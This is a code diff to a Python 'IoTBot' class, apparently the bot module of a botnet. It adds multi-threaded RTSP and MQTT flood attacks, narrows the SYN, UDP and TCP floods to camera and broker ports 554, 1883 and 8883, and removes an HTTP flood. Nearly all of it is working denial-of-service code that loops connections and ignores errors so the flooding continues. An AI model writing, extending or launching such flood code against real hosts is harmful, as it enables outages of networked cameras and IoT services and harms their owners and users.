@@ -126,8 +126,10 @@ class IoTBot:
             
             if attack_type.lower() == "syn":
                 return self.execute_syn_flood(target)
-            elif attack_type.lower() == "http":
-                return self.execute_http_flood(target)
+            elif attack_type.lower() == "rtsp":
+                return self.execute_rtsp_flood(target)
+            elif attack_type.lower() == "mqtt":
+                return self.execute_mqtt_flood(target)
             else:
                 return self.execute_alternative_flood(target)
                 
@@ -142,8 +144,8 @@ class IoTBot:
                 self.log("hping3 not available, using alternative flood method")
                 return self.execute_alternative_flood(target)
             
-            # IoT broker ports
-            target_ports = [1883, 8883, 80, 443, 8080]
+            # IoT broker ports (RTSP and MQTT)
+            target_ports = [554, 1883, 8883]  # RTSP, MQTT, MQTT over SSL
             
             for port in target_ports:
                 cmd = [
@@ -180,6 +182,104 @@ class IoTBot:
             self.log(f"Failed to start SYN flood: {e}")
             return self.execute_alternative_flood(target)
     
+    def execute_rtsp_flood(self, target):
+        """Execute RTSP flood attack"""
+        try:
+            self.log(f"Starting RTSP flood attack against {target}")
+            
+            def rtsp_flood_worker():
+                """Worker thread for RTSP flood"""
+                rtsp_commands = [
+                    "OPTIONS rtsp://{}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n",
+                    "DESCRIBE rtsp://{}/ RTSP/1.0\r\nCSeq: 2\r\n\r\n",
+                    "SETUP rtsp://{}/ RTSP/1.0\r\nCSeq: 3\r\n\r\n",
+                    "PLAY rtsp://{}/ RTSP/1.0\r\nCSeq: 4\r\n\r\n"
+                ]
+                
+                while self.running and self.attack_process:
+                    try:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(1)
+                        
+                        # Connect to RTSP port
+                        sock.connect((target, 554))
+                        
+                        # Send RTSP commands
+                        for cmd in rtsp_commands:
+                            if not self.running or not self.attack_process:
+                                break
+                            sock.send(cmd.format(target).encode())
+                            time.sleep(random.uniform(0.001, 0.01))
+                        
+                        sock.close()
+                        
+                    except Exception:
+                        pass  # Ignore errors and continue flooding
+            
+            # Start multiple RTSP flood threads
+            for i in range(5):
+                thread = threading.Thread(target=rtsp_flood_worker)
+                thread.daemon = True
+                thread.start()
+                self.attack_threads.append(thread)
+            
+            self.attack_process = True
+            self.log("RTSP flood attack started")
+            return True
+            
+        except Exception as e:
+            self.log(f"Failed to start RTSP flood: {e}")
+            return False
+    
+    def execute_mqtt_flood(self, target):
+        """Execute MQTT flood attack"""
+        try:
+            self.log(f"Starting MQTT flood attack against {target}")
+            
+            def mqtt_flood_worker():
+                """Worker thread for MQTT flood"""
+                while self.running and self.attack_process:
+                    try:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(1)
+                        
+                        # Connect to MQTT port
+                        sock.connect((target, 1883))
+                        
+                        # Send MQTT CONNECT packet
+                        connect_packet = bytearray([
+                            0x10,  # CONNECT packet type
+                            0x0C,  # Remaining length
+                            0x00, 0x04,  # Protocol name length
+                            0x4D, 0x51, 0x54, 0x54,  # "MQTT"
+                            0x04,  # Protocol version
+                            0x02,  # Connect flags
+                            0x00, 0x3C,  # Keep alive
+                            0x00, 0x00   # Client ID length
+                        ])
+                        
+                        sock.send(connect_packet)
+                        time.sleep(random.uniform(0.001, 0.01))
+                        sock.close()
+                        
+                    except Exception:
+                        pass  # Ignore errors and continue flooding
+            
+            # Start multiple MQTT flood threads
+            for i in range(5):
+                thread = threading.Thread(target=mqtt_flood_worker)
+                thread.daemon = True
+                thread.start()
+                self.attack_threads.append(thread)
+            
+            self.attack_process = True
+            self.log("MQTT flood attack started")
+            return True
+            
+        except Exception as e:
+            self.log(f"Failed to start MQTT flood: {e}")
+            return False
+    
     def execute_alternative_flood(self, target):
         """Alternative flood method using Python sockets"""
         try:
@@ -204,7 +304,7 @@ class IoTBot:
             
             def udp_flood_worker():
                 """Worker thread for UDP flood"""
-                udp_ports = [1883, 53, 123, 161]  # MQTT, DNS, NTP, SNMP
+                udp_ports = [554, 1883, 8883]  # RTSP, MQTT, MQTT over SSL
                 
                 while self.running and self.attack_process:
                     try:
@@ -225,7 +325,7 @@ class IoTBot:
                         pass
             
             # Start multiple TCP flood threads for different ports
-            tcp_ports = [80, 443, 1883, 8883, 8080, 22, 23]
+            tcp_ports = [554, 1883, 8883]  # RTSP, MQTT, MQTT over SSL
             
             for port in tcp_ports:
                 thread = threading.Thread(target=tcp_flood_worker, args=(port,))
@@ -245,59 +345,6 @@ class IoTBot:
             
         except Exception as e:
             self.log(f"Failed to start alternative flood: {e}")
-            return False
-    
-    def execute_http_flood(self, target):
-        """Execute HTTP flood attack"""
-        try:
-            self.log(f"Starting HTTP flood attack against {target}")
-            
-            def http_flood_worker():
-                """Worker thread for HTTP flood"""
-                urls = [
-                    f"http://{target}",
-                    f"http://{target}:80",
-                    f"http://{target}:8080",
-                    f"https://{target}",
-                    f"https://{target}:443"
-                ]
-                
-                headers = {
-                    'User-Agent': 'Mozilla/5.0 (compatible; Research Bot)',
-                    'Accept': '*/*',
-                    'Connection': 'keep-alive'
-                }
-                
-                while self.running and self.attack_process:
-                    for url in urls:
-                        if not self.running or not self.attack_process:
-                            break
-                        
-                        try:
-                            response = requests.get(
-                                url, 
-                                headers=headers, 
-                                timeout=1,
-                                verify=False
-                            )
-                        except:
-                            pass  # Ignore errors and continue
-                        
-                        time.sleep(random.uniform(0.01, 0.05))
-            
-            # Start multiple HTTP flood threads
-            for i in range(5):
-                thread = threading.Thread(target=http_flood_worker)
-                thread.daemon = True
-                thread.start()
-                self.attack_threads.append(thread)
-            
-            self.attack_process = True
-            self.log("HTTP flood attack started")
-            return True
-            
-        except Exception as e:
-            self.log(f"Failed to start HTTP flood: {e}")
             return False
     
     def stop_attack(self):
@@ -415,4 +462,4 @@ def main():
         sys.exit(0)
 
 if __name__ == "__main__":
-    main()
+    main() 
